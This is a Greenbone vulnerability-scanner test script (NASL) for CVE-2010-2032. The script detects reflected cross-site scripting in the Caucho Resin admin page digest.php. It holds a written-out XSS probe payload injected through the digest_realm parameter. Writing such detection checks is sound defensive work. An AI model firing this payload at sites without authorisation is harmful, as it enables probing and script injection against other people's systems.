# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901115");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-05-28 16:52:49 +0200 (Fri, 28 May 2010)");
  script_cve_id("CVE-2010-2032");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Caucho Resin Multiple Cross-Site Scripting Vulnerabilities");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Caucho Technology Resin Professional 3.1.5, 3.1.10 and 4.0.6.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
  'digest_username' and 'digest_realm' parameters in resin-admin/digest.php
  that allows the attackers to insert arbitrary HTML and script code.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the latest version of Caucho Technology Resin Professional 4.0.7.");

  script_tag(name:"summary", value:"Caucho Resin is prone to multiple cross-site scripting vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/39839");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40251");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/511341");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/1005-exploits/cauchoresin312-xss.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

res = http_get_cache(item:"/resin-admin/", port:port);

if('>Resin Admin Login<' >< res)
{
  url = '/resin-admin/digest.php?digest_attempt=1&digest_realm="><script>alert' + "('VT-XSS-Test')</script><a&digest_username[]=";
  if(http_vuln_check(port:port, url:url, pattern:"<script>alert\('VT-XSS-Test'\)</script>", check_header:TRUE)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
  }
}
